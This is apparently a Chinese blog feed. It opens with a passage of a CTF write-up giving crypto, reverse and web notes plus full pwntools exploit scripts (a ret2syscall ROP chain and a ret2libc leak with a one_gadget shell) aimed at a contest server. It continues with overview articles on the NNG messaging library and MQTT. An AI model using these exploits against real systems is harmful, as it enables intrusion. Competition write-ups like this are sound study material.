class="hljs-number">248314924649425376092667318144109655550</span>, <span class="hljs-number">116605977425896048557273717492096177262</span>, <span class="hljs-number">130883156720507560420446459921008261211</span>, <span class="hljs-number">254134740809858803078213400623952076908</span>]<br><br>a = [ZZ(i*inverse_mod(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>, q)%q) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A]<br>b = [ZZ(i*inverse_mod(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>, q)%q) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b]<br><br>n = <span class="hljs-number">4</span><br>L0 = matrix(ZZ, <span class="hljs-number">1</span>, n)<br>L1 = matrix(ZZ, <span class="hljs-number">1</span>, n)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    _a0 = inverse_mod(a[<span class="hljs-number">0</span>], q)<br>    L0[<span class="hljs-number">0</span>, i] = ZZ(a[i+<span class="hljs-number">1</span>]*_a0%q)<br>    L1[<span class="hljs-number">0</span>, i] = ZZ((b[<span class="hljs-number">0</span>]*a[i+<span class="hljs-number">1</span>]-b[i+<span class="hljs-number">1</span>]*a[<span class="hljs-number">0</span>])*_a0%q)<br>L = block_matrix([<br>    [<span class="hljs-number">1</span>, L0, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, L1, ZZ(q)],<br>    [<span class="hljs-number">0</span>, ZZ(q), <span class="hljs-number">0</span>]<br>]).LLL()<br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> L:<span class="hljs-built_in">print</span>([_.nbits() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> row])<br>e0 = <span class="hljs-built_in">abs</span>(L[-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])<br>m = ZZ((b[<span class="hljs-number">0</span>]+e0)*inverse_mod(a[<span class="hljs-number">0</span>], q)%q)<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment"># HSNCTF&#123;d05dd7e4-9ee0-4ce1-b358-a4e5209555df&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>sa = <span class="hljs-keyword">lambda</span> s,n : sh.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : sh.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : sh.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : sh.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : sh.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : sh.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span> s = <span class="hljs-literal">False</span> : sh.recvline(s)<br>ti = <span class="hljs-keyword">lambda</span> : sh.interactive()<br><br>sh = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>sh = remote(<span class="hljs-string">&#x27;58.240.236.231&#x27;</span>, <span class="hljs-number">49003</span>)<br>syscall = <span class="hljs-number">0x0000000000400741</span><br>pop_rdi = <span class="hljs-number">0x000000000040072b</span><br>pop_rsi = <span class="hljs-number">0x0000000000400735</span><br>pop_rdx = <span class="hljs-number">0x000000000040073f</span><br>pop_rax = <span class="hljs-number">0x0000000000400721</span><br><br>rop = p64(pop_rax) + p64(<span class="hljs-number">59</span>)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">0x0000000000601048</span>)<br>rop += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>rop += p64(syscall)<br><br>sla(<span class="hljs-string">&#x27;input:&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + rop)<br><br>ti()<br></code></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>sa = <span class="hljs-keyword">lambda</span> s,n : sh.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : sh.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : sh.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : sh.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : sh.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : sh.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span> s = <span class="hljs-literal">False</span> : sh.recvline(s)<br>ti = <span class="hljs-keyword">lambda</span> : sh.interactive()<br><br>sh = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/ccc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)<br>sh = remote(<span class="hljs-string">&#x27;58.240.236.231&#x27;</span>, <span class="hljs-number">49002</span>)<br>pop_rdi = <span class="hljs-number">0x0000000000400783</span><br>pop_rsi2 = <span class="hljs-number">0x0000000000400781</span><br>main = <span class="hljs-number">0x0000000004006FD</span><br>leak = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd8</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x0000000000601018</span>) + p64(<span class="hljs-number">0x0000000000400520</span>) + p64(main)<br>sla(<span class="hljs-string">&#x27;name:&#x27;</span>, leak)<br><br>libc_base = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og = libc_base + <span class="hljs-number">0xf1247</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd8</span> + p64(og)<br>sla(<span class="hljs-string">&#x27;name:&#x27;</span>, payload)<br>ti()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h3><p>还以为和冬令营一模一样的题，结果看错了对象。上面的混淆运算才是flag</p><p><img src="/mdimg/2023sswk/6.png"></p><p>chatGPT写个脚本完事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">charArr = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;0db530c0e9752357b1ae4cf7ea8331ae&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">4</span>):<br>        temp = charArr[j]<br>        charArr[j] = charArr[j - <span class="hljs-number">4</span>]<br>        charArr[j - <span class="hljs-number">4</span>] = temp<br><br>    <br>    temp2 = charArr[i - <span class="hljs-number">1</span>]<br>    charArr[i - <span class="hljs-number">1</span>] = charArr[i - <span class="hljs-number">2</span>]<br>    charArr[i - <span class="hljs-number">2</span>] = temp2<br><br>original_string = <span class="hljs-string">&quot;&quot;</span>.join(charArr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Original String:&quot;</span>, original_string)<br><br><span class="hljs-comment">#hsnctf&#123;d35b300c92570e57b1ae4cf7ea8331ae&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>这个没什么好说的。</p><h3 id="easyusb"><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h3><p>板子题 注意有<code>[CAPS]</code> 所以解压密码为全大写 解开压缩包就是flag</p><p><img src="/mdimg/2023sswk/7.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>三个原题，一个不咋会web的人拿了三个前三血</p><h3 id="primitive"><a href="#primitive" class="headerlink" title="primitive"></a>primitive</h3><p>今年冬令营一模一样的题 参考我自己的博客</p><p><a href="https://g1at.github.io/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/#Primitive-php">https://g1at.github.io/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/#Primitive-php</a></p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>[BJDCTF2020]原题，你猜我怎么找到的，Google识图😂</p><p><a href="https://www.jianshu.com/p/7092f56dcbbc">https://www.jianshu.com/p/7092f56dcbbc</a></p><h3 id="uns"><a href="#uns" class="headerlink" title="uns"></a>uns</h3><p>CTFshow原题   唯一变化就是admin.php改成了session.php</p><p><a href="https://blog.csdn.net/Kracxi/article/details/122885954">https://blog.csdn.net/Kracxi/article/details/122885954</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NNG协议</title>
    <link href="/2023/08/10/NNG/"/>
    <url>/2023/08/10/NNG/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><a href="https://github.com/nanomsg/nng">NNG</a> 是 nanomsg 的继任版本，而 nanomsg 则是流行的 ZMQ （一个简单好用的传输层，像框架一样的一个 socket library）的 C 重写版。</p><p>NNG 将通信使用的协议和传输分离，同一个协议可以工作在不同的传输层上，类似与 TCP/IP 的应用层和传输层的分层，同时接口上屏蔽了底层细节，统一用字符串 URL 来描述传输模式。这样当使用场景修改时，可以通过简单修改 URL 来实现适应，极具灵活性。</p><p>同时如 NNG 描述所言 “light-weight brokerless messaging”，NNG 中的通信各方是不需要第三方程序介入的，这与 MQTT/Redis 通信需要服务器不同。这样很适合作为通信库来使用而没有其他依赖。</p><p>以下是一些 nng 的主要特点：</p><ol><li>协议独立性： nng 提供了多种通信模式（协议），如请求-回复、发布-订阅、推送-拉取等。每种模式都有相应的协议，使开发人员能够根据应用程序的需求选择适当的通信方式。</li><li>轻量级： nng 的设计着重于保持轻量级和高性能。它专注于提供基本的通信机制，避免过多的复杂性。</li><li>可扩展性： nng 允许开发人员在需要的时候添加新的传输协议，以适应不同的通信需求。这使得 nng 在不同的场景中都能够发挥作用。</li><li>错误处理和可靠性： nng 设计了更好的错误处理机制，以便在通信出现问题时更好地报告和处理错误。它还提供了一些协议，如 REQ/REP，以实现可靠的请求和回复模式。</li><li>异步通信： nng 支持异步通信模式，使开发人员能够实现高效的并发操作。</li><li>跨平台： nng 可在多个操作系统上运行，包括 Linux、Windows 和 macOS。</li></ol><h2 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h2><ul><li>PAIR 一对一双向通信。</li><li>PIPELINE(PUSH/PULL) 单向通信，类似与生产者消费者模型的消息队列。</li><li>PUB/SUB 单向广播。</li><li>REQ/REP 请求-应答模式，类似与 RPC 模式。</li><li>BUS 网状连接通信，每个加入节点都可以发送/接受广播消息。</li><li>SURVEY 用于多节点表决或者服务发现。</li></ul><h2 id="传输模式"><a href="#传输模式" class="headerlink" title="传输模式"></a>传输模式</h2><ul><li>inproc 进程内线程间传输</li><li>ipc 主机内进程间传输</li><li>tcp 网络内主机间传输</li></ul><h2 id="通讯模式"><a href="#通讯模式" class="headerlink" title="通讯模式"></a>通讯模式</h2><ol><li>不同机器进程间：<br>TCP - network transport via TCP<br>WS - websockets over TCP<br>服务端：”tcp://*:5555”<br>客户端：”tcp://localhost:5555”</li><li>同台机器进程间：<br>IPC - transport between processes on a single machine<br>ipc:///tmp/reqrep.ipc</li></ol><p>​     INPROC - transport within a process (between threads, modules etc.)</p><ol><li>同进程的线程，模块间通信：<br>“inproc://rot13”</li></ol><p>通信协议里除了 PAIR 之外，基本都是一对多的通信模式，这点需要注意。</p><p>以 PIPELINE 和 PUB/SUB 为例：</p><ul><li>PIPELINE 的 PUSH 端是 client，一个 PUSH 可以连接多个 PULL 端，发送数据时会选择其中一个可用的发送；PULL 端是 server，一个 PULL 可以接收多个 PUSH 连接和数据。</li><li>PUB/SUB 的 SUB 端是 client，一个 SUB 可以连接多个不同的 PUB 端，接收多个 PUB 端广播的数据；PUB 端是 server，一个 PUB 可以接收多个 SUB 连接并广播数据。</li></ul><p>基于以上，多个程序是没办法共用一个 PUB/SUB 通道来广播数据的，这与 ROS 里的 topic 和 LCM 中的 channel 模式不同。如果要实现类似功能，则可以使用 PIPELINE + PUB/SUB 来处理：</p><ul><li>独立一个话题发布的程序，拥有一个 PULL 和 PUB。</li><li>PULL 约定一个 URL，所有需要发布该话题的程序都 PUSH 数据到该 URL 上。</li><li>PUB 约定一个 URL，所有需要获取该话题的程序都 SUB 到该 URL 上。</li><li>程序内部循环将 PULL 读取的数据发送到 PUB 上。</li><li>以上则可以模拟出 ROS topic 数据合并 或者 LCM 中 channel 的类似功能。</li></ul><p>整体上看，NNG 的 API 很简约，主要是 4 个，open/recv/send/close，open 根据协议不同使用的函数会不同。配置则是 setopt/getopt，与 UNIX API 类似。API 中没有上下文环境（context-less）依赖，只需要一个 nng_socket，这种设计和实现方法值得去学习一下（初步揣测应该是使用指针值作为handle，如果要强制编译器做类型检测，则会套上一层 struct，如 <code>typedef struct &#123; _nng_xxx_socket * p &#125; nng_socket;</code></p><p>NNG 协议基本上囊括了常见的通信需求，一些特殊的需求，也可以通过组合协议来实现，比如上面的模拟 ROS topic 或者 LCM channel 的方法。这样一来，如果在程序中使用 NNG，不管是多进程，还是多线程，通过设计，可以进一步增强模块化，同时不乏灵活性。如果环境变化，程序不管是由多进程改成多线程，还是由多线程改成多主机，都很容易实现。</p><p>常见模块/进程/线程间通信，可以依据具体需求来使用 PIPELINE（消息队列） 还是 REQ/REP（过程调用），而不是锁+全局变量，每个模块单元只需要做单一相关的具体事务，无需知晓全局状态。</p><h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">nng.h:</span><br></code></pre></td></tr></table></figure><p>nng对外暴露的 api 接口</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">transport.h:</span><br></code></pre></td></tr></table></figure><p>通信层定义，主要是为了暴露给用户以实现扩展，但目前包含了utils下的相关头文件，其中<code>inproc.h/ipc.h/tcp.h</code>是对应的transport</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">protocol.h:</span><br></code></pre></td></tr></table></figure><p>协议层定义，也是为了暴露给用户以实现扩展，其中<code>reqrep.h/pubsub.h/bus.h/pair.h/pipeline.h/survey.h</code>是对应的protocol</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">utils/:</span><br></code></pre></td></tr></table></figure><p>实用工具包，包含基本数据结构(<code>list/queue/hash</code>)、互斥及原子操作(<code>mutex/atomic</code>)等</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">transports/:</span><br></code></pre></td></tr></table></figure><p>通信层实现，包括(inproc:进程内通信；ipc:进程间通信；tcp：tcp通信)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">protocols/:</span><br></code></pre></td></tr></table></figure><p>协议层实现，包括(REQREP:请求响应；PUBSUB:订阅发布等)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">core/:</span><br></code></pre></td></tr></table></figure><p>通用代码</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">aio/:</span><br></code></pre></td></tr></table></figure><p>线程池模拟的异步操作，带状态机的事件驱动等</p><h2 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h2><h3 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">nng_sendmsg<br><br>nng_aio_<span class="hljs-keyword">set</span>_timeout<br><br>nng_aio_<span class="hljs-keyword">set</span>_msg<br><br>nng_send_aio<br><br>nni_aio_get_msg<br><br>nni_sock_find<br><br>nni_sock_send --&gt; sock_send<br><br>nni_sock_rele<br><br>nng_aio_wait<br><br>nng_aio_result<br></code></pre></td></tr></table></figure><h3 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h3><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xl">nng_recvmsg<br><br>nng_aio_set_timeout<br><br>nng_recv_aio<br><br>nni_sock_find<br><br><span class="hljs-function"><span class="hljs-title">nni_sock_recv</span> --&gt;</span> sock_recv<br><br>nni_sock_rele<br><br>nng_aio_wait<br><br>nng_aio_result<br><br>nng_aio_free<br></code></pre></td></tr></table></figure><h2 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h2><h3 id="AIO状态"><a href="#AIO状态" class="headerlink" title="AIO状态"></a>AIO状态</h3><p>AIO 结构可以携带最多 4 个不同的输入值，最多 4 个不同的输出值，以及最多 4 个不同的“私有状态”值。 输入和输出的含义由被调用的 I/O 函数决定。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elm">typedef enum &#123;<br><br><span class="hljs-type">NNG_INIT_RECV</span> = 0,<br><br><span class="hljs-type">NNG_RECV_RET_SEND</span>,<br><br><span class="hljs-type">NNG_SEND_RET_RECV</span>,<br><br><span class="hljs-type">NNG_RECV_RET_RECV</span>,<br><br>&#125; nng_aio_state_t;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MQTT协议</title>
    <link href="/2023/08/09/MQTT/"/>
    <url>/2023/08/09/MQTT/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是-MQTT？"><a href="#什么是-MQTT？" class="headerlink" title="什么是 MQTT？"></a>什么是 MQTT？</h2><p>MQTT（Message Queuing Telemetry Transport）是一种轻量级、基于发布-订阅模式的消息传输协议，适用于资源受限的设备和低带宽、高延迟或不稳定的网络环境。它在物联网应用中广受欢迎，能够实现传感器、执行器和其它设备之间的高效通信。</p><h2 id="MQTT-与其他协议对比"><a href="#MQTT-与其他协议对比" class="headerlink" title="MQTT 与其他协议对比"></a>MQTT 与其他协议对比</h2><h3 id="MQTT-vs-HTTP"><a href="#MQTT-vs-HTTP" class="headerlink" title="MQTT vs HTTP"></a>MQTT vs HTTP</h3><ul><li>MQTT 的最小报文仅为 2 个字节，比 HTTP 占用更少的网络开销。</li><li>MQTT 与 HTTP 都能使用 TCP 连接，并实现稳定、可靠的网络连接。</li><li>MQTT 基于发布订阅模型，HTTP 基于请求响应，因此 MQTT 支持双工通信。</li><li>MQTT 可实时推送消息，但 HTTP 需要通过轮询获取数据更新。</li><li>MQTT 是有状态的，但是 HTTP 是无状态的。</li><li>MQTT 可从连接异常断开中恢复，HTTP 无法实现此目标。</li></ul><h3 id="MQTT-vs-XMPP"><a href="#MQTT-vs-XMPP" class="headerlink" title="MQTT vs XMPP"></a>MQTT vs XMPP</h3><p>MQTT 协议设计简单轻量、路由灵活，将在移动互联网、物联网消息领域，全面取代 PC 时代的 XMPP 协议。</p><ul><li>MQTT 报文体积小且编解码容易，XMPP 基于繁重的 XML，报文体积大且交互繁琐。</li><li>MQTT 基于发布订阅模式，相比 XMPP 基于 JID 的点对点消息路由更为灵活。</li><li>MQTT 支持 JSON、二进制等不同类型报文。XMPP 采用 XML 承载报文，二进制必须 Base64 编码等处理。</li><li>MQTT 通过 QoS 保证消息可靠传输，XMPP 主协议并未定义类似机制。</li></ul><h2 id="MQTT-的工作原理"><a href="#MQTT-的工作原理" class="headerlink" title="MQTT 的工作原理"></a>MQTT 的工作原理</h2><h3 id="MQTT-客户端"><a href="#MQTT-客户端" class="headerlink" title="MQTT 客户端"></a>MQTT 客户端</h3><p>任何运行 <a href="https://www.emqx.com/zh/mqtt-client-sdk">MQTT 客户端库</a>的应用或设备都是 MQTT 客户端。例如，使用 MQTT 的即时通讯应用是客户端，使用 MQTT 上报数据的各种传感器是客户端，各种 <a href="https://www.emqx.com/zh/blog/mqtt-client-tools">MQTT 测试工具</a>也是客户端。</p><h3 id="MQTT-Broker"><a href="#MQTT-Broker" class="headerlink" title="MQTT Broker"></a>MQTT Broker</h3><p>MQTT Broker 是负责处理客户端请求的关键组件，包括建立连接、断开连接、订阅和取消订阅等操作，同时还负责消息的转发。一个高效强大的 MQTT Broker 能够轻松应对海量连接和百万级消息吞吐量，从而帮助物联网服务提供商专注于业务发展，快速构建可靠的 MQTT 应用。</p><p>关于 MQTT Broker 的更多详情，请参阅文章 <a href="https://www.emqx.com/en/blog/the-ultimate-guide-to-mqtt-broker-comparison">2023 年最全面的 MQTT Broker 比较指南</a>。</p><h3 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布-订阅模式"></a>发布-订阅模式</h3><p>发布-订阅模式与客户端-服务器模式的不同之处在于，它将发送消息的客户端（发布者）和接收消息的客户端（订阅者）进行了解耦。发布者和订阅者之间无需建立直接连接，而是通过 MQTT Broker 来负责消息的路由和分发。</p><p>下图展示了 MQTT 发布/订阅过程。温度传感器作为客户端连接到 MQTT Broker，并通过发布操作将温度数据发布到一个特定主题（例如 Temperature）。MQTT Broker 接收到该消息后会负责将其转发给订阅了相应主题（Temperature）的订阅者客户端。</p><p><img src="/mdimg/mqtt1/2.png"></p><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>MQTT 协议根据主题来转发消息。主题通过 / 来区分层级，类似于 URL 路径，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">chat/room/1<br><br>sensor/10/temperature<br><br>sensor/+/temperature<br></code></pre></td></tr></table></figure><p>MQTT 主题支持以下两种通配符：<code>+</code> 和 <code>#</code>。</p><ul><li><code>+</code>：表示单层通配符，例如 <code>a/+</code> 匹配 <code>a/x</code>或 <code>a/y</code>。</li><li><code>#</code>：表示多层通配符，例如 <code>a/#</code> 匹配 <code>a/x</code>、<code>a/b/c/d</code>。</li></ul><p>***注意***<em>：通配符主题只能用于订阅，不能用于发布。</em></p><p>关于 MQTT 主题的更多详情，请参阅文章<a href="https://www.emqx.com/zh/blog/advanced-features-of-mqtt-topics">通过案例理解 MQTT 主题与通配符</a>。</p><h3 id="QoS"><a href="#QoS" class="headerlink" title="QoS"></a>QoS</h3><p>MQTT 提供了三种服务质量（QoS），在不同网络环境下保证消息的可靠性。</p><ul><li>QoS 0：消息最多传送一次。如果当前客户端不可用，它将丢失这条消息。</li><li>QoS 1：消息至少传送一次。</li><li>QoS 2：消息只传送一次。</li></ul><p>关于 MQTT QoS 的更多详情，请参阅文章 <a 